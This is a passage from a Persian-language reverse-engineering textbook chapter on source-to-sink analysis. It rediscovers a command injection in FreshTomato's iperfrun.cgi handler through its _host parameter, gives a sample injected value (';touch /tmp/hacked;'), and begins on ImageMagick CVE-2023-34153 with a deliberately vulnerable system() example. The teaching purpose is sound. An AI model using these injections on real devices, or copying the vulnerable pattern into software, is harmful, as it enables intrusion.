## فصل ۵: کشف منبع و چاهک در باینری (Source and Sink Discovery)

> *«همه‌چیز همچون اقیانوسی است؛ همه‌چیز جریان دارد و به هم پیوسته است. اگر در یک نقطه به آن دست بزنی، در آن سوی جهان طنین‌انداز می‌شود.»*
> — فیودور داستایوفسکی، *برادران کارامازوف*

با وجود محبوبیت فریمورک‌های مبتنی بر اسکریپت مانند Electron، واقعیت این است که بخش قابل توجهی از باینری‌هایی که با آن‌ها روبه‌رو می‌شوید به کد ماشین کامپایل شده‌اند؛ به دلایل عملی و تاریخی. حتی با بهترین مولدهای شبه‌کد، تحلیل باینری‌های پیچیده‌تر می‌تواند دشوار باشد. برای همه — جز باتجربه‌ترین مهندسان معکوس — دست‌وپا زدن میان صدها تابع بالشت‌شده به دنبال آسیب‌پذیری می‌تواند طاقت‌فرسا باشد.

در چنین موقعیت‌هایی، اولویت‌بندی کلید ماجراست. در این فصل، تاکتیک‌های تحلیل ایستا (Static Analysis) و داینامیک (Dynamic Analysis) را برای شناسایی منبع‌ها (Source) و چاهک‌ها (Sink) در یک باینریِ کامپایل‌شده به کد ماشین اعمال می‌کنید. همچنین می‌آموزید چگونه مسیرهای میان منبع‌ها و چاهک‌ها را به‌طور کارآمد ردیابی کنید تا آسیب‌پذیری‌های Firmware روتر FreshTomato و کتابخانه پردازش تصویر ImageMagick را دوباره کشف کنید. اگرچه این‌ها پروژه‌های متن‌بازند، این مثال‌ها را از منظر جعبه‌سیاه (Black-Box) بررسی می‌کنید و سپس یافته‌هایتان را با کد منبع واقعی مقایسه خواهید کرد.

در طول این مسیر، بهره‌برداری‌پذیری (Exploitability) مسیرهای منبع-به-چاهکِ شناسایی‌شده را ارزیابی می‌کنید تا آن‌ها را به‌عنوان آسیب‌پذیری‌های واقعی، صلاحیت‌سنجی کنید.

### تحلیل ایستا (Static Analysis)

تحلیل ایستا به بررسی نرم‌افزار بدون اجرای آن گفته می‌شود و معمولاً نقطه شروع مهندسی معکوس است. شوخی رایجی میان مهندسان معکوس هست که ۹۰ درصد کار، فشار دادن کلید X در IDA Pro است — کلیدی که فهرست ارجاع‌ها به یک تابع یا متغیر خاص را در بقیه دی‌اسمبلی نشان می‌دهد. این تاکتیکی رایج برای ردیابی چاهک-به-منبع است، با این تفاوت که به‌جای کار روی کد منبع — مانند فصل ۱ — آن را در یک دی‌اسمبلر یا دی‌کامپایلر انجام می‌دهید. جدا از شوخی، این رویکرد در نرم‌افزارهای کمتر سخت‌گیرانه‌محافظت‌شده، می‌تواند به‌طرز شگفت‌آوری ثمربخش باشد.

می‌توانید این روش را با FreshTomato بیازمایید؛ یک Firmware متن‌باز برای روترهای مبتنی بر تراشه Broadcom. برخلاف باینری‌هایی که در فصل قبل بررسی کردید، این Firmware برای معماری‌های ARM و MIPS کامپایل شده که مجموعه دستورالعمل متفاوتی نسبت به معماری x86 و x86-64 — که معمولاً در دسکتاپ‌ها و سرورها استفاده می‌شود — دارند. مواجهه با این معماری‌ها در باینری‌های Firmware رایج است، زیرا این دستگاه‌ها اغلب به بهره‌وری انرژی بالاتری که آن‌ها ارائه می‌دهند نیاز دارند.

نسخه 2022.5 مربوط به روتر AC1450 را از آدرس https://freshtomato.org/downloads/freshtomato-arm/2022/2022.5/K26ARM/freshtomato-AC1450-ARM_NG-2022.5-AIO-64K.zip دانلود کنید. پس از استخراج آرشیو، یک گزارش تغییرات (Changelog)، یک فایل README و یک فایل .trx به دست می‌آورید (TRX یک فرمت شناخته‌شده فایل به‌روزرسانی Firmware برای دستگاه‌های Broadcom است).

می‌توانید از Binwalk برای باز کردن فایل .trx استفاده کنید. Binwalk ابزاری برای استخراج ایمیج‌های Firmware است. با توجه به پیش‌نیازهای متنوعش، استفاده از نسخه داخلی نصب‌شده در توزیع Kali Linux ساده‌تر است. توجه کنید که همچنین باید Sasquatch را نصب کنید؛ ابزاری که فرمت فایل‌سیستم فشرده SquashFS را مدیریت می‌کند، زیرا Binwalk برای برخی عملیات استخراج به آن متکی است. چند باگ ظریف فرایند بیلد sasquatch را در Kali می‌شکنند که پژوهشگر Pavel Pi مستند کرده و راه‌حلش را به اشتراک گذاشته است؛ این راه‌حل در دستورات زیر آمده که برای نصب صحیح Sasquatch باید اجرا کنید:

```bash
$ sudo apt-get update
$ sudo apt-get install build-essential liblzma-dev liblzo2-dev zlib1g-dev
$ git clone https://github.com/devttys0/sasquatch && cd sasquatch
$ ADDLINE="sed -i 's/-Wall -Werror/-Wall/g' patches/patch0.txt"
$ sed -i "/^tar -zxvf.*/a $ADDLINE" ./build.sh
$ CFLAGS=-fcommon ./build.sh
```

پس از نصب Sasquatch، می‌توانید Firmware را استخراج کنید. از گزینه‌های extract یعنی (-e) و recursive یعنی (-M) در Binwalk برای باز کردن بسته استفاده کنید:

```bash
$ unzip freshtomato-AC1450-ARM_NG-2022.5-AIO-64K.zip
$ binwalk -eM freshtomato-AC1450-ARM_NG-2022.5-AIO-64K.trx
$ ls -l _freshtomato-AC1450-ARM_NG-2022.5-AIO-64K.trx.extracted/squashfs-root
total 80
drwxr-xr-x 2 kali kali 4096 Aug 4 2022 bin
drwxr-xr-x 2 kali kali 4096 Aug 4 2022 bkp
drwxr-xr-x 2 kali kali 4096 Aug 4 2022 cifs1
drwxr-xr-x 2 kali kali 4096 Aug 4 2022 cifs2
drwxr-xr-x 2 kali kali 4096 Aug 4 2022 dev
lrwxrwxrwx 1 kali kali    7 Aug 4 2022 etc -> tmp/etc
lrwxrwxrwx 1 kali kali    8 Aug 4 2022 home -> tmp/home
drwxr-xr-x 2 kali kali 4096 Aug 4 2022 jffs
drwxr-xr-x 3 kali kali 4096 Aug 4 2022 lib
drwxr-xr-x 2 kali kali 4096 Aug 4 2022 mmc
lrwxrwxrwx 1 kali kali    7 Aug 4 2022 mnt -> tmp/mnt
drwxr-xr-x 2 kali kali 4096 Aug 4 2022 nas
drwxr-xr-x 2 kali kali 4096 Aug 4 2022 opt
drwxr-xr-x 2 kali kali 4096 Aug 4 2022 proc
drwxr-xr-x 3 kali kali 4096 Aug 4 2022 rom
lrwxrwxrwx 1 kali kali   13 Aug 4 2022 root -> tmp/home/root
drwxr-xr-x 2 kali kali 4096 Aug 4 2022 sbin
drwxr-xr-x 2 kali kali 4096 Aug 4 2022 sys
drwxrwxrwx 2 kali kali 4096 Aug 4 2022 tftpboot
drwxr-xr-x 2 kali kali 4096 Aug 4 2022 tmp
drwxr-xr-x 8 kali kali 4096 Aug 4 2022 usr
lrwxrwxrwx 1 kali kali    7 Aug 4 2022 var -> tmp/var
drwxr-xr-x 3 kali kali 12288 Jun 6 10:23 www
```

پوشه squashfs-root شامل فایل‌سیستم Firmware‌ای است که روی روتر بارگذاری می‌شود. هنگام نگاشت سطح حمله یک روتر، یکی از نخستین مکان‌هایی که باید بررسی کنید، دایرکتوری /www یا /var/www است، زیرا معمولاً اسکریپت‌ها و باینری‌هایی را شامل می‌شود که رابط مدیریتی وب روتر را هندل می‌کنند.

با این حال، در این مورد، www فقط فایل‌های .asp، .js و .css را شامل می‌شود که نماها (View) رندر‌شده توسط رابط وب را مدیریت می‌کنند و هیچ منطق کسب‌وکار سمت سروری ندارند. همچنین می‌توانید به دنبال باینری‌ای به نام httpd بگردید؛ مخفف «Hypertext Transfer Protocol daemon» که معمولاً وب‌سرور مورد استفاده روتر را در بر دارد.

برخلاف وب‌سرورهای پیچیده‌تر مانند Apache (که آن هم از نام پروسه httpd استفاده می‌کند) یا Nginx (که از nginx استفاده می‌کند)، باینری httpd در Firmware تمایل دارد کاملاً خودکفا باشد و منطق مسیریابی و کسب‌وکار سفارشیِ هاردکدشده را شامل شود. این به دلیل محدودیت فضا و توان محاسباتی روترها و سایر دستگاه‌های سخت‌افزاری است. یک جستجوی سریع نشان می‌دهد که این باینری واقعاً در usr/sbin/httpd وجود دارد.

#### Dump کردن رشته‌ها (Dumping Strings)

حتی پیش از استفاده از دی‌اسمبلر، باید رشته‌های قابل چاپ (Printable Strings) را در باینری بررسی کنید. برای این کار می‌توانید یک ترفند دیگرِ به‌طرز شگفت‌آوری مؤثر را بیازمایید: strings. فهرست ۵-۱ گزیده کوچکی از خروجی این دستور را نشان می‌دهد.

```text
$ strings ./squashfs-root/usr/sbin/httpd
--snip--
fgets
get_wanfaces
❶ system
--snip--
❷ Content-Type: %s
Cache-Control: max-age=%d
Cache-Control: no-cache, no-store, must-revalidate, private
Expires: Thu, 31 Dec 1970 00:00:00 GMT
Pragma: no-cache
Connection: close
<html><head><title>Error</title></head><body><h2>%d %s</h2> %s</body></html>
--snip--
❸ grep -ih "%s" $(ls -1rv %s %s.*)
which
cat $(ls -1rv %s %s.*) | tail -n %d
--snip--
❹ cfg/restore.cgi
cfg/defaults.cgi
stats/*.gz
```

*فهرست ۵-۱: گزیده‌ای از رشته‌های موجود در httpd*

این خروجی قویاً نشان می‌دهد که باینری، وب‌سرور رابط مدیریتی را هندل می‌کند و به میوه‌های نزدیک و در دسترس (Low-Hanging Fruit) اشاره دارد. نخست، شامل نام‌های توابع جالب منبع و چاهک مانند system ❶ است که دستورات شل را مستقیماً اجرا می‌کند، و همچنین رشته‌های فرمت (Format String) که در پاسخ‌های HTTP استفاده می‌شوند ❷. دوم، از رشته‌های فرمت در دستورات شل استفاده می‌کند ❸ که نشان می‌دهد این چاهک‌ها ممکن است تحت کنترل مهاجم باشند. در نهایت، شامل مسیرهای بالقوه‌ای است که می‌توان روی وب‌سرور به آن‌ها دسترسی یافت ❹.

با یک جستجوی ساده، توانستید چندین ناحیه را برای بررسی بیشتر شناسایی کنید. حالا به سراغ دی‌اسمبلر می‌رویم.

#### دی‌اسمبل و دی‌کامپایل با Ghidra (Disassembling and Decompiling with Ghidra)

در فصل ۴ با Ghidra CodeBrowser کمی تجربه کسب کردید. اکنون از آن برای تحلیل ایستای عمیق‌تر استفاده می‌کنید. CodeBrowser باینری را دی‌اسمبل می‌کند — یعنی کد ماشین را به کد اسمبلیِ خوانا برای انسان تبدیل می‌کند — و سپس آن را به شبه‌کد سطح‌بالاتر دی‌کامپایل می‌کند.

در Ghidra یک پروژه جدید آغاز و باینری httpd را به آن اضافه کنید. سپس آن را در CodeBrowser باز کنید. تحلیلگر باید به نقطه ورود (Entry Point) باینری بپرد. برای باینری‌های کوچک‌تر می‌توانید از اینجا شروع کنید، اما برای باینری‌های بزرگ‌تر، ممکن است کار به عقب — با استراتژی تحلیل چاهک-به-منبع — مؤثرتر باشد. این کار با یافتن فراخوانی‌های توابع کتابخانه‌ای خطرناک آغاز می‌شود.

در سمت چپ پنجره CodeBrowser باید پنل Symbol Tree را ببینید. همان‌طور که از نامش پیداست، بازنمایی درختی نمادهاست. توجه کنید که این پنل فقط نمادهایی را شامل می‌شود که توابع داخلیِ تعریف‌شده در خود برنامه را بازنمایی می‌کنند.

به‌جای آن، باید به پوشه Imports مراجعه کنید که شامل نمادهایی است که فضای نام کتابخانه‌های خارجی را بازنمایی می‌کنند. پوشه را باز کنید تا فهرستی از کتابخانه‌های خارجی مانند libc.so.0 و libmssl.so و همچنین <EXTERNAL> باز شود. مورد اخیر، انتزاعی است که Ghidra برای نگهداری نمادهای خارجی که هنوز به کتابخانه خاصی مرتبط نشده‌اند، به کار می‌برد.

نکته جالب اینکه وقتی پوشه‌های کتابخانه‌های خارجی را باز می‌کنید، می‌بینید که هیچ تابع ایمپورت‌شده‌ای ندارند. فقط پوشه <EXTERNAL> نمادها را دارد (مانند getpid که متعلق به کتابخانه استاندارد C است). ماجرا چیست؟

نخست، جدول نمادهای باینری را dump کنید:

```text
$ objdump -t httpd
httpd: file format elf32-little
SYMBOL TABLE:
no symbols
```

هیچ ورودی در جدول نمادها نیست، که نشان می‌دهد باینری Stripped است. می‌توانید این را به‌سرعت با دستور file تأیید کنید:

```bash
$ file usr/sbin/httpd
usr/sbin/httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
```

باینری هم با لینک داینامیک است و هم Stripped شده. این سناریویی رایج برای Firmware دستگاه‌هایی است که محدودیت ذخیره‌سازی جدی دارند، زیرا هر دو گزینه به کاهش اندازه باینری کمک می‌کنند. باید به‌جای آن، جدول نمادهای داینامیک را dump کنید:

```text
$ objdump -T httpd
httpd: file format elf32-little
DYNAMIC SYMBOL TABLE:
0000a504 DF *UND* 00000000 get_wan6face
0000a510 DF *UND* 00000000 rewind
0000a51c DF *UND* 00000000 bind
00000000 wD *UND* 00000000 __register_frame_info
0000a534 DF *UND* 00000000 getNVRAMVar
0000a540 DF *UND* 00000000 strftime
0000a54c DF *UND* 00000000 mssl_init
```

این به شما درک بهتری می‌دهد که چرا Symbol Tree در Ghidra، نمادهای ایمپورت‌شده را در پوشه <EXTERNAL> قرار می‌دهد.

اگر میان توابع بگردید، دو تابع می‌یابید که ممکن است آسیب‌پذیر باشند: popen و system. هر دو، آرگومان اول خود را به‌عنوان دستور شل در یک پروسه جدید اجرا می‌کنند — معادل پاس دادن آن به /bin/sh با پرچم -c.

با توجه به قابلیت‌های فراوانِ مرتبط با سیستم در یک رابط وبِ مدیریت روتر، تعجب‌آور نیست که سرور از این توابع کتابخانه‌ای استفاده می‌کند. در واقع، اگر فقط بر چاهک‌های popen و system در چندین Firmware روتر تمرکز کنید، احتمالاً می‌توانید چندین آسیب‌پذیری تزریق دستور (Command Injection) بیابید.

اگرچه عبارت «X marks the spot» به میان‌بر صفحه‌کلید X در IDA Pro اشاره دارد، میان‌بر معادل برای نمایش ارجاع‌ها به یک نماد در Ghidra، دکمه‌های CTRL-SHIFT-F است. با این حال، اگر این کار را با popenِ انتخاب‌شده در Symbol Tree امتحان کنید، فقط یک ارجاع به خودش برمی‌گرداند. به یاد آورید که نمادهای با لینک داینامیک در دی‌کامپایلر به‌شکل «توابع تثبیت» (Thunk Function) مصنوعی بازنمایی می‌شوند که توابع بارگذاری‌شده از خارج را در زمان اجرا نشان می‌دهند. در Ghidra این چنین دیده می‌شود:

```text
thunk FILE * popen(char * __command, char * __modes)
    Thunked-Function: <EXTERNAL>::popen
    FILE * r0:4 <RETURN>
    char * r0:4 __command
    char * r1:4 __modes
<EXTERNAL>::popen
```

<EXTERNAL>::popen را انتخاب و از میان‌بر صفحه‌کلید استفاده کنید (همچنین می‌توانید راست‌کلیک و References ▶ Show References to popen را انتخاب کنید) تا ارجاع‌های تابع واقعی خارجی popen را بگیرید، نه تابع تثبیت مصنوعی را:

```text
0000e970  bl <EXTERNAL>::popen   UNCONDITIONAL_CALL
0000f098  bl <EXTERNAL>::popen   UNCONDITIONAL_CALL
0000f118  bl <EXTERNAL>::popen   UNCONDITIONAL_CALL
00011748  bl <EXTERNAL>::popen   UNCONDITIONAL_CALL
00013d64  bl <EXTERNAL>::popen   UNCONDITIONAL_CALL
0001ad1c  bl <EXTERNAL>::popen   UNCONDITIONAL_CALL
```

این‌ها همه فراخوانی‌های popen در بقیه برنامه‌اند. پس از یافتن فراخوانی‌های یک چاهک بالقوه آسیب‌پذیر، می‌توانید ردیابی آن‌ها را به سمت منبع‌های تحت‌کنترل-مهاجم آغاز کنید. مهندسی معکوس باینری‌ها مستلزم حدس‌های آگاهانه درباره کاری است که یک تابع خاص — یا حتی یک متغیر — انجام می‌دهد، بر اساس سرنخ‌های بافتی مانند دستورات لاگ. علاوه بر این، می‌توانید رفتار تابع را در حین تحلیل داینامیک نیز مشاهده کنید.

هدف برنامه را با دقت در نظر بگیرید. در این مورد، یک وب‌سرور است که درخواست‌ها و پاسخ‌های HTTP را هندل می‌کند. این یعنی توابعی که درخواست‌های HTTP را مدیریت می‌کنند، رشته‌های مرتبط با HTTP را پردازش خواهند کرد. علاوه بر این، هنگام بازگرداندن پاسخ‌های HTTP، برنامه باید رشته‌های مرتبط با HTTP را خروجی دهد. پس در حین کارِ به‌عقب از چاهک‌های بالقوه مانند popen، باید مراقب این موارد باشید. رشته‌های رایج مرتبط با HTTP عبارت‌اند از:

- افعال HTTP مانند GET، POST، PUT، PATCH، DELETE و HEAD
- پارامترهای درخواست که با فیلدهای فرم HTML یا کد جاوااسکریپت مطابقت دارند
- نوع‌های محتوا (Content-Type) استفاده‌شده در درخواست‌ها و پاسخ‌های HTTP، مانند text/plain، application/json و application/x-www-form-urlencoded
- مسیرهای URI که با مسیرهای معتبر وب‌سرور مطابقت دارند
- سایر هدرهای درخواست/پاسخ مانند Authorization، Host، User-Agent، Date و Access-Control-Allow-Origin

اگر از میان ارجاع‌های مختلف popen عبور کنید، می‌بینید که آخرین ارجاع در 0x0001ad1c در تابع FUN_0001abc0 به نظر می‌رسد پارامترهای درخواست را بازیابی می‌کند؛ همان‌طور که فهرست ۵-۲ نشان می‌دهد.

```c
void FUN_0001abc0(void)
{
    --snip--
    pcVar1 = (char *)FUN_0000cfdc("_port");
    if (pcVar1 == (char *)0x0) {
        pcVar1 = "5201";
    }
    iVar2 = atoi(pcVar1);
    pcVar1 = (char *)FUN_0000cfdc("_udpProto");
    if (pcVar1 == (char *)0x0) {
        pcVar1 = "0";
    }
    puVar3 = (undefined *)atoi(pcVar1);
    pcVar1 = (char *)FUN_0000cfdc("_limitMode");
    if (pcVar1 == (char *)0x0) {
        pcVar1 = "0";
    }
    iVar4 = atoi(pcVar1);
    pcVar1 = (char *)FUN_0000cfdc("_limit");
    if (pcVar1 == (char *)0x0) {
        pcVar1 = "10";
    }
    uVar8 = strtoull(pcVar1, (char **)0x0, 0);
    pcVar1 = (char *)FUN_0000cfdc("_mode");
    if ((pcVar1 != (char *)0x0) && (*pcVar1 != '\0')) {
        --snip--
```

*فهرست ۵-۲: شبه‌کد دی‌کامپایل‌شده تابع FUN_0001abc0*

مقادیر رشته‌ای _port، _udpProto، _limitMode و _limit می‌توانند پارامترهای درخواست باشند. همگی الگوی مشترکی دارند: به‌عنوان آرگومان به FUN_0000cfdc پاس داده می‌شوند و مقادیر بازگشتی برای رشته خالی بررسی می‌شوند. اگر رشته خالی یافت شود، به یک مقدار پیش‌فرض تنظیم می‌شوند. شبه‌کد تولیدشده برای FUN_0000cfdc را بررسی کنید:

```c
int FUN_0000cfdc(ACTION param_1, undefined4 param_2)
{
    ENTRY __item;
    ENTRY **unaff_r4;
    int unaff_r5;
    if (DAT_00030c8c == 0) {
        unaff_r5 = 0;
    }
    else {
        __item.data = (void *)param_2;
        __item.key = (char *)&DAT_00030c8c;
❶        hsearch_r(__item, param_1, unaff_r4, (hsearch_data *)0x0);
        if (unaff_r5 != 0) {
            unaff_r5 = *(int *)(unaff_r5 + 4);
        }
    }
    return unaff_r5;
}
```

این تابع hsearch_r را ❶ فراخوانی می‌کند؛ تابعی از کتابخانه استاندارد C که جستجوی جدول هش (Hash Table) انجام می‌دهد. این با ایده بازیابی مقدار یک پارامتر بر اساس کلیدِ ارائه‌شده مطابقت دارد. اگر این تابع را در IDA Pro تحلیل می‌کردید، با امضاهای شناخته‌شده به‌طور خودکار آن را به‌عنوان WebsGetVar شناسایی می‌کرد. به بیان دیگر، این تابع یک پارامتر HTTP را از یک درخواست GET بازیابی می‌کند.

با این حال، چنین امضاهای شناخته‌شده‌ای همیشه در دسترس نیستند. در عوض می‌توانید بقیه Firmware را برای رشته‌های پارامتر درخواست HTTP بالقوه‌ای که مشاهده کردید، جستجو کنید. برای محدود کردن تعداد مثبت‌های کاذب، رشته‌ای منحصربه‌فردتر مانند _limitMode را به‌جای _port انتخاب کنید. این به شما یک نتیجه غیر از httpd می‌دهد:

```text
$ grep -r "_limitMode" .
grep: ./usr/sbin/httpd: binary file matches
./www/tools-iperf.asp:+ '&_limitMode=' + (limitMode ? '1' : '0')
```

رشته _limitMode در tools-iperf.asp ظاهر می‌شود؛ یک فایل Active Server Pages (ASP) که وب‌سرورها از آن برای تولید داینامیک صفحات وب استفاده می‌کنند — مشابه Jakarta Server Pages (JSP) برای برنامه‌های وب مبتنی بر جاوا. اگرچه یافتن فایل‌های ASP خارج از سرورهای Internet Information Services (IIS) کمی غیرعادی است، برای Firmware‌ای مانند FreshTomato غیرممکن نیست که زیرمجموعه محدودی از سینتکس و قابلیت‌های ASP را پشتیبانی کند.

در هر صورت، مهم‌ترین نکته در اینجا این است که _limitMode در فایلی ظاهر می‌شود که برای تولید یک نما در رابط وب استفاده می‌شود؛ یعنی یک پارامتر معتبر است. نگاه دقیق‌تری به tools-iperf.asp بیندازید: می‌بینید که _limitMode در تابع runButtonClick استفاده شده است:

```javascript
function runButtonClick() {
❶    var requestCommand = new XmlHttp();
    requestCommand.onCompleted = function(text, xml) {
    }
    requestCommand.onError = function(x) {
        E('test_status').innerHTML = 'ERROR: ' + x;
        execute();
    }
    if (iperf_up == 1) {
        requestCommand.post('iperfkill.cgi', '');
    } else {
        var transmitMode = E('iperf_transm').checked == true;
        var limitMode = E('iperf_size_limited').checked == true;
        var limit = E(limitMode ? 'byte_limit' : 'time_limit').value;
        var udpProtocol = E('iperf_proto_udp').checked == true;
        var ttcpPort = E('iperf_port').value;
        var paramStr = '_mode=' + (transmitMode ? 'client' : 'server') +
            '&_udpProto=' + (udpProtocol ? '1' : '0') +
            '&_port=' + ttcpPort +
❷            '&_limitMode=' + (limitMode ? '1' : '0') +
            '&_limit=' + limit;
        if (transmitMode) {
            paramStr += '&_host=' + E('iperf_addr').value;
        }
❸        requestCommand.post('iperfrun.cgi', paramStr);
    }
    E('test_status').innerHTML = '';
    E('test_xfered').innerHTML = '';
    E('test_time').innerHTML = '';
    E('test_speed').innerHTML = '';
}
```

این تابع XmlHttp() را به متغیر requestCommand ❶ نسبت می‌دهد که نشان می‌دهد یک درخواست HTTP ارسال خواهد شد. سپس رشته‌ای شامل _limitMode را با چند پارامتر دیگر در متغیر paramStr ❷ الحاق می‌کند و تأیید می‌کند که _limitMode یک پارامتر درخواست معتبر است. در نهایت، درخواست POST را به مسیر iperfrun.cgi ❸ می‌فرستد.

از آنجا که رشته‌های پارامتر بالقوه در FUN_0001abc0 با پارامترهای ارسالی توسط requestCommand مطابقت دارند، منطقی است فرض کنیم FUN_0001abc0 درخواست‌های ارسالی به iperfrun.cgi را هندل می‌کند. با این حال، کارتان هنوز تمام نشده است. اگرچه پیوند میان چاهک popen و مسیر iperfrun.cgi را برقرار کردید، هنوز تأیید نکرده‌اید که واقعاً قابل بهره‌برداری است.

اگر بررسی کنید که پارامترهای _port، _udpProto و _limitMode چگونه در FUN_0001abc0 پردازش می‌شوند، می‌بینید که مقادیر رشته‌ای در واقع با توابع کتابخانه استاندارد atoi و strtoull به مقادیر عدد صحیح و عدد صحیح بلند بدون علامت تبدیل می‌شوند. این یعنی یک حمله بالقوه از نظر ورودی‌های قابل کنترل، به‌شدت محدود است.

خوشبختانه همه‌چیز از دست نرفته است. فعلاً مقادیر پارامترهای پردازش‌شده را با میان‌بر L در Ghidra تغییر نام دهید و سپس به بقیه FUN_0001abc0 نگاهی بیندازید.

```c
❶    pcVar1 = (char *)FUN_0000cfdc("_mode");
    if ((pcVar1 != (char *)0x0) && (*pcVar1 != '\0')) {
        snprintf(acStack_a0, 0x80, "%d", _portValue);
❷        iVar2 = strcmp(pcVar1, "server");
        if (iVar2 == 0) {
❸            snprintf(acStack_1a0, 0x100,
                "iperf -J --logfile /tmp/iperf_log --intervalfile \t\t\t/tmp/iperf_interval -I /var/run/iperf.pid -s -1 -D -p %d",
                _portValue);
        }
        else {
❹            pcVar1 = (char *)FUN_0000cfdc("_host");
            if ((pcVar1 != (char *)0x0) && (*pcVar1 != '\0')) {
                puVar4 = _udpProtoValue;
                if (_udpProtoValue == (undefined *)0x1) {
                    puVar4 = &UNK_000281d1;
                }
                puVar3 = &UNK_000281d4;
                if (_udpProtoValue != (undefined *)0x1) {
                    puVar4 = &DAT_0001b232;
                }
                if (_limitModeValue != 1) {
                    puVar3 = &UNK_000281d7;
                }
❺                snprintf(acStack_1a0, 0x100,
                    "iperf -J --logfile /tmp/iperf_log --intervalfile \t\t\t\t/tmp/iperf_interval -p %d %s %s %llu -c %s &",
                    _portValue, puVar4, puVar3, _limitValue, pcVar1);
            }
        }
❻        __stream = popen(acStack_1a0, "r");
        pclose(__stream);
    }
```

نخست، پارامتر _mode پردازش ❶ و با server ❷ مقایسه می‌شود. اگر مطابقت داشته باشند، مقادیر پردازش‌شده پارامترها با استفاده از رشته فرمت ❸ درج می‌شوند. رشته نهایی یعنی acStack_1a0 به popen ❻ پاس داده می‌شود. اما همان‌طور که قبلاً اشاره شد، در این حالت همه ورودی‌های بالقوه تحت‌کنترل-مهاجم به اعداد صحیح یا رشته ثابت server محدودند. بنابراین این مسیر قابل بهره‌برداری نیست.

اما اگر به شاخه‌ای بروید که مقدار پارامتر _mode با server مطابقت ندارد، پارامتر دیگری به نام _host ❹ پردازش و به رشته فرمت ❺ اضافه می‌شود که سرانجام به popen پاس داده می‌شود. مهاجم می‌تواند با فرستادن پارامتر _host با مقداری مانند ;touch /tmp/hacked; دستورات شل خود را با موفقیت تزریق کند.

> توجه: آسیب‌پذیری‌های دیگری از نوع تزریق دستور در این نسخه از FreshTomato وجود دارد. سعی کنید آن‌ها را پیدا کنید! راهنمایی: از FUN_00013d58 شروع کنید که به popen ارجاع می‌دهد. اگرچه به نظر نمی‌رسد تابع هندلرِ درخواست باشد، همچنان مانند یک Wrapper دور popen عمل می‌کند و در بسیاری از هندلرهای درخواست دیگر استفاده می‌شود. ببینید آیا یکی از آن‌ها شما را به یک CVE شناخته‌شده می‌رساند یا خیر.

این تمرین قدرت تاکتیک «X marks the spot» را حتی در برنامه‌های پیچیده‌ای مانند Firmware روتر نشان می‌دهد. با ترکیب تحلیل ایستای فرانت‌اند و بک‌اند، می‌توان تکه‌های پازل را کنار هم گذاشت و بدون داشتن کد منبع، ردیابی چاهک-به-منبع را انجام داد.


### تحلیل داینامیک (Dynamic Analysis)

تا اینجا فقط بر تحلیل ایستا متکی بودید. این رویکرد برای باینری‌های کوچک نسبتاً قابل مدیریت است، اما وقتی با فایل‌های اجرایی بزرگ‌تری سر و کار دارید، عملی‌تر بودنش کمتر می‌شود. برای مثال، نرم‌افزارهای دسکتاپی مانند Microsoft Word اغلب صدها کتابخانه را ایمپورت می‌کنند و هزاران بلوک دستورالعمل دارند که مهندسی معکوسشان به‌سادگی ممکن نیست. در چنین موقعیت‌هایی رویکرد داینامیک ممکن است مناسب‌تر باشد.

تحلیل داینامیک از تحلیل ایستا در این است که در واقع برنامه را اجرا می‌کنید تا رفتارش را در زمان اجرا (Runtime) مشاهده کنید، به‌جای اینکه صرفاً باینری کامپایل‌شده را در حالت سکون تحلیل کنید. یکی از مزایای این رویکرد این است که بخش بزرگی از حدس‌زنی‌ها و عدم قطعیت‌های تحلیل ایستا را از بین می‌برد.

تحلیل داینامیک بینش‌هایی به رفتار واقعی زمان اجرا می‌دهد — شامل مقادیر متغیرها در حافظه — به‌جای اتکا به حدس‌هایی بر اساس درک محدود شما از دستورالعمل‌های اسمبلی یا شبه‌کد. می‌توانید با استفاده از یک دیباگر، به‌سرعت دستورالعمل‌های واقعیِ درگیر را پیدا کنید. با این حال، نقطه ضعفش این است که ابتدا باید بتوانید برنامه را اجرا کنید. اگر کتابخانه‌های لازم را ندارید یا هدف روی معماری پردازنده دیگری اجرا می‌شود، باید به یک Emulator متوسل شوید و از راه‌حل‌های موقتی مانند Mock کردن فراخوانی‌های کتابخانه‌ای استفاده کنید.

برای تمرین تحلیل داینامیک، آسیب‌پذیری تزریق دستور (CVE-2023-34153) را در ImageMagick — یک برنامه محبوب پردازش تصویر — دوباره کشف خواهید کرد. برای لینوکس، ImageMagick به‌شکل AppImage توزیع می‌شود که یک فایل‌سیستم فشرده با همه کتابخانه‌های لازم را در بر دارد. می‌توانید نسخه آسیب‌پذیر را از مخزن گیت‌هاب در آدرس https://github.com/ImageMagick/ImageMagick/releases/download/7.1.1-9/ImageMagick--gcc-x86_64.AppImage دانلود کنید. از آنجا که باید باینری magick را مستقیماً — نه AppImage را — به‌صورت داینامیک تحلیل کنید، باید فایل‌سیستم فشرده را استخراج کنید.

برای این کار دستورات زیر را اجرا کنید:

```bash
$ chmod +x ImageMagick--gcc-x86_64.AppImage
$ ./ImageMagick--gcc-x86_64.AppImage --appimage-extract
```

این دستور یک پوشه squashfs-root در دایرکتوری کاری فعلی شما استخراج می‌کند که همه وابستگی‌های لازم و باینری هدف یعنی magick را شامل می‌شود. با کامل شدن آماده‌سازی، وقت تحلیل داینامیک است.

#### ردیابی فراخوانی‌های کتابخانه و سیستم (Tracing Library and System Calls)

تقریباً هر برنامه‌ای نیاز به فراخوانی توابع کتابخانه‌ای ایمپورت‌شده دارد. با تحلیل این فراخوانی‌ها می‌توانید بینش‌هایی به سازوکار درونی برنامه به دست آورید. برای باینری‌های با لینک داینامیک، می‌توانید این فراخوانی‌ها را با ltrace رهگیری کنید. طبق مستندات آن:

> ltrace برنامه‌ای است که صرفاً دستور مشخص‌شده را تا زمان خروج اجرا می‌کند. فراخوانی‌های کتابخانه داینامیکِ اجرا‌شده توسط پروسه و سیگنال‌های دریافتیِ آن پروسه را رهگیری و ثبت می‌کند. همچنین می‌تواند فراخوانی‌های سیستمی (System Call) اجرا‌شده توسط برنامه را رهگیری و چاپ کند.

در پشت صحنه، ltrace در stubهای فراخوانی تابع کتابخانه Breakpoint درج می‌کند تا هر فراخوانی تابع کتابخانه و آرگومان‌هایش را هنگام برخورد با Breakpoint رهگیری کند. می‌توانید این را با مثال آموزشی ساده در فهرست ۵-۳ — که در مخزن کد کتاب هم موجود است — بیازمایید.

```c
hello-vuln.c
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char *argv[]) {
    char name[30];
    char command[100];
    printf("Enter your name: ");
    scanf("%s", name);
    snprintf(command, sizeof(command), "echo Hello, %s", name);
    int result = system(command);
